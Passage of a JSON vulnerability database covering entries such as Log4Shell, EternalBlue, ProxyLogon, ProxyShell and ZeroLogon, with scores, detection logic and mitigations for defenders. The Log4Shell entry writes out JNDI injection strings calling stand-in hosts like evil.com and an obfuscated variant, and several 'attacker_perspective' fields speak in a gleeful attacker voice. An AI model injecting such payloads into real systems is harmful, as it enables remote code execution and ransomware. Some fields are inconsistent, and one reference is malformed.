    "severity": "High",
    "cvss_v3_score": 8.6,
    "cwe_id": "CWE-918",
    "vulnerability_type": "Server-Side Request Forgery",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Server-side request forgery vulnerability in specific Apache HTTP Server configurations.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-36474"
    ]
  },
  {
    "id": 97,
    "cve_id": "CVE-2024-37079",
    "vulnerability_name": "VMware Cloud Foundation Privilege Escalation",
    "vendor": "VMware",
    "product": "Cloud Foundation",
    "severity": "High",
    "cvss_v3_score": 8.1,
    "cwe_id": "CWE-269",
    "vulnerability_type": "Privilege Escalation",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1068",
        "technique_name": "Exploitation for Privilege Escalation"
      }
    ],
    "summary": "Privilege escalation vulnerability affecting VMware Cloud Foundation deployments.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-37079"
    ]
  },
  {
    "id": 98,
    "cve_id": "CVE-2024-51569",
    "vulnerabilityName": "CyberPanel Information Disclosure",
    "vendor": "CyberPanel",
    "product": "CyberPanel",
    "severity": "Medium",
    "cvss_v3_score": 6.5,
    "cwe_id": "CWE-200",
    "vulnerability_type": "Information Disclosure",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1005",
        "technique_name": "Data from Local System"
      }
    ],
    "summary": "Information disclosure vulnerability exposing sensitive configuration data.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-51569"
    ]
  },
  {
    "id": 99,
    "cve_id": "CVE-2024-52301",
    "vulnerability_name": "CrushFTP Path Traversal",
    "vendor": "CrushFTP",
    "product": "CrushFTP",
    "severity": "Critical",
    "cvss_v3_score": 9.8,
    "cwe_id": "CWE-22",
    "vulnerability_type": "Path Traversal",
    "known_exploited": "No",
    "kev_catalog": "No",
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "summary": "Path traversal vulnerability that may lead to arbitrary file access and remote compromise.",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2024-52301"
    ]
  },
  {
    "id": 100,
    "cve_id": "CVE-2021-44228",
    "vulnerability_name": "Log4Shell",
    "aliases": [
      "Log4j JNDI RCE"
    ],
    "year": 2021,
    "published_date": "2021-12-10",
    "last_updated": "2024-01-15",
    "vendor": "Apache",
    "product": "Log4j",
    "affected_versions": [
      "2.0-beta9 through 2.14.1"
    ],
    "platforms": [
      "Windows",
      "Linux",
      "macOS",
      "AWS",
      "Azure",
      "GCP",
      "Container",
      "Kubernetes"
    ],
    "vulnerability_type": "Remote Code Execution (RCE)",
    "cwe_id": "CWE-502",
    "cvss_v2_score": 9.3,
    "cvss_v3_score": 10,
    "cvss_v4_score": 0,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Apache Log4j2 2.0-beta9 through 2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
    "technical_summary": "The vulnerability exists in how Log4j processes log messages containing the ${} syntax. If an attacker injects a JNDI string (e.g., ${jndi:ldap://[attacker.com/a](https://attacker.com/a)}), the Log4j framework attempts to resolve it by querying the provided LDAP/RMI/DNS server. The malicious server responds with a remote Java class file path, which Log4j downloads and executes within the application context, resulting in unauthenticated remote code execution.",
    "executive_summary": "Log4Shell is a critical, easily exploitable vulnerability in a widely used Java logging library. It allows remote attackers to take full control of affected servers over the internet. Due to its pervasive use across enterprise software and cloud platforms, immediate identification and patching are required to prevent severe business disruption and data theft.",
    "attacker_perspective": "This is a goldmine. I just need to spray JNDI lookup strings into any input field—HTTP headers, login forms, search boxes—that might get logged by the backend. Once the server logs my payload, it fetches and executes my code. It requires zero authentication and provides a highly reliable reverse shell or automated deployment mechanism for miners or ransomware.",
    "attack_story": "The attacker scanned the internet for web servers, sending automated HTTP requests with a malicious User-Agent header containing a JNDI payload. The target company's web server logged the User-Agent using Log4j. Log4j parsed the payload, reached out to the attacker's LDAP server, downloaded a malicious Java payload, and executed it. The attacker gained a reverse shell, deployed Cobalt Strike, escalated privileges, and deployed ransomware across the domain.",
    "attack_prerequisites": [
      "Target application uses a vulnerable version of Apache Log4j2.",
      "Target application logs user-controlled input.",
      "Target server has outbound network access (to fetch the malicious payload)."
    ],
    "attack_flow": [
      "Attacker identifies a target application and an input vector (e.g., HTTP header, input field).",
      "Attacker crafts a malicious payload containing a JNDI lookup (e.g., ${jndi:ldap://[evil.com/Exploit](https://evil.com/Exploit)}).",
      "Attacker sends the payload to the target application.",
      "Target logs the payload via Log4j, which resolves the JNDI lookup, downloads the malicious class, and executes it."
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      },
      {
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell"
      }
    ],
    "kill_chain_phase": [
      "Exploitation",
      "Delivery"
    ],
    "affected_services": [
      "Web Servers",
      "Application Servers",
      "Database Servers",
      "Cloud Services"
    ],
    "network_ports": [
      "80",
      "443",
      "8080",
      "389",
      "1389",
      "1099"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "ExploitDB",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [
      "Mirai",
      "Kinsing",
      "Muhstik"
    ],
    "known_ransomware": [
      "Conti",
      "Khonsari"
    ],
    "known_apt_groups": [
      "APT41",
      "Phosphorus",
      "HAFNIUM"
    ],
    "real_world_campaigns": [
      "Widespread cryptocurrency miner deployment in late 2021",
      "Nation-state intelligence gathering by Chinese and Iranian actors",
      "Initial access for major ransomware operations"
    ],
    "ioc_examples": [
      "${jndi:ldap://",
      "${jndi:rmi://",
      "${jndi:dns://"
    ],
    "detection_sources": [
      "WAF",
      "EDR",
      "SIEM",
      "Firewall"
    ],
    "detection_logic": "Look for application logs, WAF logs, or network traffic containing JNDI lookup patterns. Due to obfuscation techniques (e.g., ${${lower:j}ndi:}), regex-based detection must account for nested lookups. Also monitor for unexpected outbound connections on ports 389, 1389, and 1099 originating from application servers, followed by unexpected child processes spawning from Java.",
    "sigma_rule_summary": "Sigma rules focus on detecting the JNDI strings in web server logs and unexpected child processes (like cmd.exe, sh, bash) originating from java.exe or java processes.",
    "yara_rule_summary": "YARA rules hunt for compiled Java class files (.class) containing known Log4j exploit signatures, embedded JNDI strings, or specific payload class names associated with common exploit kits.",
    "suricata_rule_summary": "Network rules flag inbound HTTP requests with common JNDI strings in headers (User-Agent, Referer, X-Api-Version) and alert on anomalous outbound LDAP/RMI traffic.",
    "snort_rule_summary": "Snort signatures match on hex-encoded or plain text ${jndi: strings traversing the network, particularly targeting web application ports.",
    "business_impact": "Complete system compromise leading to data breaches, ransomware deployment, system downtime, and significant reputational damage. Widespread incident response costs due to the difficulty of finding all embedded instances of Log4j.",
    "post_exploitation": [
      "Deployment of cryptocurrency miners to consume compute resources.",
      "Establishment of persistence via web shells or backdoors.",
      "Lateral movement across the network using stolen credentials."
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Upgrade Log4j to version 2.17.1 or higher.",
      "Remove the JndiLookup class from the log4j-core JAR file.",
      "Set the log4j2.formatMsgNoLookups system property to true (for versions 2.10 to 2.14.1)."
    ],
    "patch_information": "Apache released Log4j 2.15.0 to disable message lookups by default, then 2.16.0 to remove message lookups and disable JNDI, and finally 2.17.1 to address further bypasses.",
    "hardening_recommendations": [
      "Implement stringent egress filtering to block unexpected outbound connections from servers.",
      "Deploy Web Application Firewalls (WAF) to block known exploit patterns.",
      "Maintain a comprehensive Software Bill of Materials (SBOM) to track library usage."
    ],
    "incident_response": [
      "Identify vulnerable applications using vulnerability scanners and software composition analysis.",
      "Review application and network logs for successful exploitation indicators (outbound connections, unexpected processes).",
      "Isolate compromised systems, rebuild from known good backups, and apply patches before reconnecting."
    ],
    "eme_exposure_analysis": "Organizations using Java-based applications, particularly web servers, enterprise software (like VMware products), and cloud services relying on log4j-core versions 2.0-beta9 through 2.14.1, are highly exposed. Exposure is compounded by the fact that log4j is often deeply embedded as a transitive dependency.",
    "eth_attack_narrative": "The attacker identifies an input field logged by the target application (e.g., HTTP headers like User-Agent or search boxes). They inject a JNDI lookup string payload referencing a malicious LDAP server they control. The vulnerable Log4j library parses this string, reaches out to the attacker's server, downloads a malicious Java class file, and executes it, granting the attacker a reverse shell or direct remote code execution.",
    "etd_defender_guidance": "Defenders must prioritize patching to version 2.17.1+. In the interim, deploy WAF rules to block common JNDI injection patterns, monitor for anomalous outbound LDAP/RMI traffic, use software composition analysis (SCA) to find nested Log4j instances, and enforce strict egress filtering on server networks to prevent payload retrieval.",
    "related_cves": [
      "CVE-2021-45046",
      "CVE-2021-45105",
      "CVE-2021-44832"
    ],
    "related_cwes": [
      "CWE-502",
      "CWE-400",
      "CWE-20"
    ],
    "related_exploits": [
      "Exploit-DB: 50592"
    ],
    "references": [
      "[https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)",
      "[https://logging.apache.org/log4j/2.x/security.html](https://logging.apache.org/log4j/2.x/security.html)"
    ]
  },
  {
    "id": 101,
    "cve_id": "CVE-2017-0144",
    "vulnerability_name": "EternalBlue",
    "aliases": [
      "MS17-010"
    ],
    "year": 2017,
    "published_date": "2017-03-16",
    "last_updated": "2023-08-25",
    "vendor": "Microsoft",
    "product": "Windows",
    "affected_versions": [
      "Windows Vista",
      "Windows 7",
      "Windows 8.1",
      "Windows 10",
      "Windows Server 2008",
      "Windows Server 2012",
      "Windows Server 2016"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Remote Code Execution (RCE)",
    "cwe_id": "CWE-119",
    "cvss_v2_score": 9.3,
    "cvss_v3_score": 8.1,
    "cvss_v4_score": 0,
    "severity": "High",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets.",
    "technical_summary": "A buffer overflow vulnerability in the Microsoft Server Message Block 1.0 (SMBv1) server handles specially crafted packets improperly. An unauthenticated attacker can send crafted SMBv1 packets to a vulnerable server, causing a buffer overflow in the non-paged pool memory (specifically srv.sys). By exploiting this overflow, the attacker can overwrite function pointers and execute arbitrary shellcode in the context of the SYSTEM account.",
    "executive_summary": "EternalBlue is a devastating Windows vulnerability that allows attackers to take complete control of systems without any user interaction or credentials. Leaked from the NSA and heavily utilized in global cyberattacks like WannaCry and NotPetya, it remains a severe threat for organizations running outdated Windows systems or legacy SMBv1 protocols.",
    "attacker_perspective": "EternalBlue is an operator's dream. No credentials, no user interaction, just fire a packet at port 445 on a vulnerable Windows machine and I get a SYSTEM-level shell. It's incredibly reliable and allows for immediate lateral movement across entire internal networks in seconds.",
    "attack_story": "The attacker compromised an external-facing server to gain initial access to a corporate network. From there, they ran an automated scanning tool looking for port 445. The tool found hundreds of unpatched Windows 7 and Server 2008 machines. Using the EternalBlue exploit, the attacker infected all of them simultaneously, deploying the WannaCry ransomware, which encrypted the entire network within minutes.",
    "attack_prerequisites": [
      "Target system is running a vulnerable version of Windows.",
      "SMBv1 is enabled on the target system.",
      "Target system is accessible over port 445 (or 139)."
    ],
    "attack_flow": [
      "Attacker scans network for systems with TCP port 445 open.",
      "Attacker sends crafted SMBv1 packets to trigger a buffer overflow in srv.sys.",
      "Shellcode is injected into kernel memory.",
      "Shellcode executes, providing the attacker with a SYSTEM-level backdoor (like DoublePulsar)."
    ],
    "mitre_attack": [
      {
        "technique_id": "T1210",
        "technique_name": "Exploitation of Remote Services"
      },
      {
        "technique_id": "T1134",
        "technique_name": "Access Token Manipulation"
      }
    ],
    "kill_chain_phase": [
      "Exploitation",
      "Installation"
    ],
    "affected_services": [
      "Server Message Block (SMB)"
    ],
    "network_ports": [
      "445",
      "139"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "ExploitDB"
    ],
    "known_malware": [
      "WannaCry",
      "NotPetya",
      "Retefe",
      "TrickBot"
    ],
    "known_ransomware": [
      "WannaCry",
      "NotPetya",
      "Satan"
    ],
    "known_apt_groups": [
      "Lazarus Group",
      "Sandworm Team",
      "Equation Group"
    ],
    "real_world_campaigns": [
      "WannaCry global ransomware outbreak (May 2017)",
      "NotPetya destructive malware attack (June 2017)"
    ],
    "ioc_examples": [
      "DoublePulsar backdoor ping response (Multiplex ID 65)",
      "Unexpected SMB traffic containing large non-paged pool allocations",
      "srv.sys crash dumps on failed exploitation attempts"
    ],
    "detection_sources": [
      "IDS/IPS",
      "Firewall",
      "Windows Event Logs",
      "EDR"
    ],
    "detection_logic": "Monitor network traffic for the specific byte sequences associated with the EternalBlue exploit traversing port 445. EDR tools should look for unexpected child processes spawned by lsass.exe or spoolsv.exe, and monitor for the installation of the DoublePulsar backdoor. System crashes (BSOD) related to srv.sys are strong indicators of failed exploit attempts.",
    "sigma_rule_summary": "Sigma rules focus on detecting anomalous processes spawning from svchost.exe or spoolsv.exe, and network traffic patterns matching known SMBv1 exploit signatures.",
    "yara_rule_summary": "YARA rules target the memory signatures of the DoublePulsar backdoor and the payload binaries associated with WannaCry and NotPetya.",
    "suricata_rule_summary": "Suricata contains specific signatures to detect the malicious SMB trans2 requests and specific NT TRANSACT SETUP allocations used in the EternalBlue buffer overflow.",
    "snort_rule_summary": "Snort rules detect the IPC$ tree connect and subsequent large SMB packets crafted to trigger the pool allocation overflow.",
    "business_impact": "Complete and rapid compromise of Windows domains. Facilitates destructive ransomware attacks capable of shutting down entire enterprise operations globally in minutes, causing massive financial and operational damage.",
    "post_exploitation": [
      "Installation of DoublePulsar backdoor for persistent, stealthy access.",
      "Credential dumping via Mimikatz to escalate domain privileges.",
      "Automated lateral movement and ransomware distribution."
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft security update MS17-010.",
      "Disable SMBv1 across the entire organization.",
      "Block TCP port 445 and 139 at the network perimeter."
    ],
    "patch_information": "Microsoft released patch MS17-010 in March 2017. Due to the severity, they later released out-of-band patches for unsupported operating systems like Windows XP and Windows 8.",
    "hardening_recommendations": [
      "Migrate entirely to SMBv2 or SMBv3.",
      "Implement network segmentation to prevent lateral movement via SMB.",
      "Ensure robust endpoint protection capable of blocking kernel-level memory injection."
    ],
    "incident_response": [
      "Immediately isolate affected machines from the network to prevent worm-like spread.",
      "Identify all unpatched systems using vulnerability scanners or Nmap NSE scripts.",
      "Apply MS17-010, disable SMBv1, and hunt for presence of the DoublePulsar backdoor."
    ],
    "eme_exposure_analysis": "Organizations are exposed if they operate legacy Windows operating systems (Windows 7, Server 2008) or have not disabled the obsolete SMBv1 protocol. Exposure is highly critical if these systems are internet-facing or if internal network segmentation is poor, allowing rapid lateral movement.",
    "eth_attack_narrative": "The attacker sends a series of crafted SMBv1 packets to a target machine's port 445. These packets exploit a bug in how Windows handles mathematical calculations for memory allocation in the kernel (srv.sys). The attacker overwrites memory, forcing the kernel to execute their payload. The attacker installs a backdoor (DoublePulsar) in kernel memory, bypassing standard antivirus, and gaining complete SYSTEM-level control to deploy ransomware.",
    "etd_defender_guidance": "Defenders must prioritize verifying that patch MS17-010 is applied globally and that SMBv1 is explicitly disabled via Group Policy. Ensure perimeter firewalls strictly block inbound port 445. Deploy IDS/IPS rules to detect the EternalBlue network signature and utilize EDR to hunt for DoublePulsar kernel implants.",
    "related_cves": [
      "CVE-2017-0143",
      "CVE-2017-0145",
      "CVE-2017-0146",
      "CVE-2017-0147",
      "CVE-2017-0148"
    ],
    "related_cwes": [
      "CWE-119",
      "CWE-787"
    ],
    "related_exploits": [
      "Exploit-DB: 42315",
      "Exploit-DB: 42031"
    ],
    "references": [
      "[https://nvd.nist.gov/vuln/detail/CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)",
      "[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010](https://www.google.com/search?q=https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)"
    ]
  },
  {
    "id": 102,
    "cve_id": "CVE-2023-23397",
    "vulnerability_name": "Microsoft Outlook Elevation of Privilege",
    "aliases": [
      "Outlook NTLM Credential Leak"
    ],
    "year": 2023,
    "published_date": "2023-03-14",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Microsoft Outlook",
    "affected_versions": [
      "Microsoft Outlook for Microsoft 365 Apps",
      "Outlook 2019",
      "Outlook 2016",
      "Outlook LTSC 2021"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Elevation of Privilege / NTLM Credential Leak",
    "cwe_id": "CWE-294",
    "cvss_v2_score": 0,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "A specially crafted Outlook message can trigger automatic NTLM authentication, allowing an attacker to capture Net-NTLMv2 hashes without user interaction.",
    "technical_summary": "The vulnerability abuses Outlook reminder processing, causing automatic SMB authentication to an attacker-controlled host and leaking NTLM credentials.",
    "executive_summary": "Attackers can steal Windows authentication hashes by sending a crafted email, enabling relay attacks and unauthorized access.",
    "attacker_perspective": "A single email can disclose valuable NTLM credentials without requiring the victim to open it.",
    "attack_story": "The attacker sends a crafted Outlook message. Outlook automatically connects to an attacker-controlled SMB share, exposing the victim's Net-NTLMv2 hash. The attacker relays or cracks the credential to gain access.",
    "attack_prerequisites": [
      "Victim uses a vulnerable Outlook version",
      "Outbound SMB or reachable attacker-controlled UNC path"
    ],
    "attack_flow": [
      "Craft malicious Outlook message",
      "Deliver email",
      "Automatic SMB authentication occurs",
      "Capture or relay NTLM credentials"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1187",
        "technique_name": "Forced Authentication"
      }
    ],
    "kill_chain_phase": [
      "Delivery",
      "Credential Access"
    ],
    "affected_services": [
      "Microsoft Outlook"
    ],
    "network_ports": [
      "445"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Custom Exploit",
      "Nuclei"
    ],
    "known_malware": [],
    "known_ransomware": [],
    "known_apt_groups": [
      "APT28"
    ],
    "real_world_campaigns": [
      "Targeted credential theft campaigns observed in 2023"
    ],
    "ioc_examples": [
      "\\\\attacker\\share",
      "Outbound SMB after email delivery"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Windows Event Logs",
      "Firewall"
    ],
    "detection_logic": "Alert on Outlook initiating unexpected SMB authentication or outbound connections to untrusted hosts.",
    "sigma_rule_summary": "Detect Outlook spawning unexpected SMB authentication or related events.",
    "yara_rule_summary": "Primarily network and email driven; YARA is generally applied to exploit artifacts rather than exploitation itself.",
    "suricata_rule_summary": "Detect outbound SMB sessions to suspicious external hosts.",
    "snort_rule_summary": "Alert on suspicious SMB authentication following email delivery.",
    "business_impact": "Credential theft can lead to domain compromise and lateral movement.",
    "post_exploitation": [
      "Credential relay",
      "Privilege escalation",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft's security update",
      "Block outbound SMB where appropriate",
      "Enable Extended Protection for Authentication"
    ],
    "patch_information": "Install Microsoft's March 2023 security updates.",
    "hardening_recommendations": [
      "Restrict outbound SMB",
      "Use SMB signing",
      "Monitor NTLM usage"
    ],
    "incident_response": [
      "Identify affected Outlook clients",
      "Reset exposed credentials",
      "Review SMB authentication logs"
    ],
    "eme_exposure_analysis": "High exposure if vulnerable Outlook clients can reach attacker-controlled SMB endpoints.",
    "eth_attack_narrative": "The attacker abuses Outlook's automatic processing to steal authentication material without user interaction.",
    "etd_defender_guidance": "Prioritize patching, restrict outbound SMB, and monitor forced authentication attempts.",
    "related_cves": [],
    "related_cwes": [
      "CWE-294"
    ],
    "related_exploits": [],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2023-23397",
      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397"
    ]
  },
  {
    "id": 103,
    "cve_id": "CVE-2021-26855",
    "vulnerability_name": "Microsoft Exchange Server SSRF (ProxyLogon)",
    "aliases": [
      "ProxyLogon"
    ],
    "year": 2021,
    "published_date": "2021-03-02",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Exchange Server",
    "affected_versions": [
      "Exchange Server 2013",
      "Exchange Server 2016",
      "Exchange Server 2019"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Server-Side Request Forgery (SSRF)",
    "cwe_id": "CWE-918",
    "cvss_v2_score": 0,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "An SSRF vulnerability allowing unauthenticated attackers to access the Exchange backend and facilitate remote compromise when chained with additional vulnerabilities.",
    "technical_summary": "Attackers exploit the Exchange frontend to send crafted requests to the backend, bypassing authentication and enabling subsequent code execution chains.",
    "executive_summary": "ProxyLogon enabled widespread compromise of internet-facing Exchange servers and mass deployment of web shells.",
    "attacker_perspective": "Internet-facing Exchange servers provide valuable access to enterprise email and Active Directory.",
    "attack_story": "The attacker scans for exposed Exchange servers, exploits the SSRF flaw, chains it with post-authentication vulnerabilities, installs a web shell, and pivots into the domain.",
    "attack_prerequisites": [
      "Vulnerable on-premises Exchange",
      "HTTPS exposure"
    ],
    "attack_flow": [
      "Identify Exchange",
      "Exploit SSRF",
      "Chain with RCE/file write",
      "Deploy web shell"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Persistence"
    ],
    "affected_services": [
      "Microsoft Exchange"
    ],
    "network_ports": [
      "443"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [
      "China Chopper"
    ],
    "known_ransomware": [
      "BlackKingdom"
    ],
    "known_apt_groups": [
      "HAFNIUM"
    ],
    "real_world_campaigns": [
      "Mass exploitation of Exchange servers in 2021"
    ],
    "ioc_examples": [
      "Suspicious ASPX web shells",
      "Abnormal requests to /ecp/"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "IIS Logs",
      "Firewall",
      "WAF"
    ],
    "detection_logic": "Monitor IIS logs for ProxyLogon indicators, suspicious ASPX files, and abnormal Exchange child processes.",
    "sigma_rule_summary": "Detect suspicious IIS worker processes spawning shells or PowerShell.",
    "yara_rule_summary": "Detect common Exchange web shell families.",
    "suricata_rule_summary": "Inspect HTTP requests matching known ProxyLogon exploitation patterns.",
    "snort_rule_summary": "Alert on known ProxyLogon request signatures.",
    "business_impact": "Email compromise, credential theft, lateral movement, and ransomware deployment.",
    "post_exploitation": [
      "Web shell deployment",
      "Credential dumping",
      "Domain compromise"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Apply Microsoft security updates",
      "Remove web shells",
      "Restrict Exchange exposure"
    ],
    "patch_information": "Install Microsoft's March 2021 Exchange security updates.",
    "hardening_recommendations": [
      "Publish Exchange securely",
      "Enable EDR",
      "Monitor IIS continuously"
    ],
    "incident_response": [
      "Hunt for web shells",
      "Reset compromised credentials",
      "Rebuild compromised servers if necessary"
    ],
    "eme_exposure_analysis": "High risk for internet-facing on-premises Exchange servers.",
    "eth_attack_narrative": "The attacker abuses the SSRF flaw to reach Exchange backend services before installing persistent access.",
    "etd_defender_guidance": "Patch immediately, inspect for web shells, and monitor Exchange logs.",
    "related_cves": [
      "CVE-2021-27065",
      "CVE-2021-26857",
      "CVE-2021-26858"
    ],
    "related_cwes": [
      "CWE-918"
    ],
    "related_exploits": [
      "ProxyLogon PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-26855",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 104,
    "cve_id": "CVE-2021-34473",
    "vulnerability_name": "Microsoft Exchange ProxyShell",
    "aliases": [
      "ProxyShell"
    ],
    "year": 2021,
    "published_date": "2021-07-13",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Microsoft Exchange Server",
    "affected_versions": [
      "Exchange Server 2013",
      "Exchange Server 2016",
      "Exchange Server 2019"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Remote Code Execution",
    "cwe_id": "CWE-306",
    "cvss_v2_score": 0,
    "cvss_v3_score": 9.8,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Authentication bypass vulnerability forming part of the ProxyShell exploit chain against Microsoft Exchange.",
    "technical_summary": "Improper access control allows attackers to bypass authentication and chain vulnerabilities to achieve remote code execution.",
    "executive_summary": "ProxyShell enabled large-scale compromise of Exchange servers through internet-exposed services.",
    "attacker_perspective": "Compromising Exchange provides email access, persistence, and a foothold into Active Directory.",
    "attack_story": "The attacker identifies an exposed Exchange server, exploits ProxyShell, uploads a web shell, steals credentials, and pivots throughout the environment.",
    "attack_prerequisites": [
      "Internet-facing vulnerable Exchange server"
    ],
    "attack_flow": [
      "Discover target",
      "Bypass authentication",
      "Write web shell",
      "Execute commands"
    ],
    "mitre_attack": [
      {
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application"
      }
    ],
    "kill_chain_phase": [
      "Initial Access",
      "Execution"
    ],
    "affected_services": [
      "Exchange IIS",
      "OWA",
      "ECP"
    ],
    "network_ports": [
      "443"
    ],
    "authentication_required": "None",
    "user_interaction": "Not Required",
    "remote_exploitable": "Yes",
    "public_exploit_available": "Yes",
    "exploit_frameworks": [
      "Metasploit",
      "Nuclei",
      "Custom Exploit"
    ],
    "known_malware": [
      "China Chopper"
    ],
    "known_ransomware": [
      "LockFile"
    ],
    "known_apt_groups": [
      "HAFNIUM"
    ],
    "real_world_campaigns": [
      "Mass ProxyShell exploitation during 2021"
    ],
    "ioc_examples": [
      "Unexpected ASPX files",
      "Suspicious PowerShell spawned by w3wp.exe"
    ],
    "detection_sources": [
      "EDR",
      "SIEM",
      "Windows Event Logs",
      "WAF",
      "Firewall"
    ],
    "detection_logic": "Monitor IIS logs, web shell creation, and child processes from IIS worker processes.",
    "sigma_rule_summary": "Detect w3wp.exe spawning cmd.exe or powershell.exe.",
    "yara_rule_summary": "Identify common Exchange web shell artifacts.",
    "suricata_rule_summary": "Detect known ProxyShell HTTP request patterns.",
    "snort_rule_summary": "Alert on ProxyShell exploitation signatures.",
    "business_impact": "Email compromise, ransomware, data theft, and domain compromise.",
    "post_exploitation": [
      "Web shell persistence",
      "Credential dumping",
      "Lateral movement"
    ],
    "privilege_escalation_possible": "Yes",
    "lateral_movement_possible": "Yes",
    "data_exfiltration_possible": "Yes",
    "mitigations": [
      "Install Microsoft security updates",
      "Remove web shells",
      "Limit Exchange exposure"
    ],
    "patch_information": "Apply Microsoft Exchange cumulative updates and security patches.",
    "hardening_recommendations": [
      "Enable EDR",
      "Restrict administrative access",
      "Monitor Exchange continuously"
    ],
    "incident_response": [
      "Collect IIS logs",
      "Remove persistence",
      "Rotate credentials"
    ],
    "eme_exposure_analysis": "Critical exposure for internet-facing Exchange deployments.",
    "eth_attack_narrative": "The attacker chains authentication bypass with Exchange flaws to obtain remote code execution and persistence.",
    "etd_defender_guidance": "Patch immediately and hunt aggressively for web shells and suspicious IIS activity.",
    "related_cves": [
      "CVE-2021-34523",
      "CVE-2021-31207"
    ],
    "related_cwes": [
      "CWE-306"
    ],
    "related_exploits": [
      "ProxyShell PoC"
    ],
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
      "https://msrc.microsoft.com/update-guide/"
    ]
  },
  {
    "id": 105,
    "cve_id": "CVE-2020-1472",
    "vulnerability_name": "ZeroLogon",
    "aliases": [
      "Netlogon Elevation of Privilege"
    ],
    "year": 2020,
    "published_date": "2020-08-11",
    "last_updated": "2024-01-09",
    "vendor": "Microsoft",
    "product": "Windows Netlogon",
    "affected_versions": [
      "Windows Server 2008 R2",
      "Windows Server 2012",
      "Windows Server 2016",
      "Windows Server 2019"
    ],
    "platforms": [
      "Windows"
    ],
    "vulnerability_type": "Elevation of Privilege",
    "cwe_id": "CWE-330",
    "cvss_v2_score": 0,
    "cvss_v3_score": 10,
    "cvss_v4_score": null,
    "severity": "Critical",
    "exploitability": "High",
    "known_exploited": "Yes",
    "kev_catalog": "Yes",
    "description": "Improper use of cryptographic authentication in the Netlogon protocol allows an unauthenticated attacker to impersonate a domain controller.",
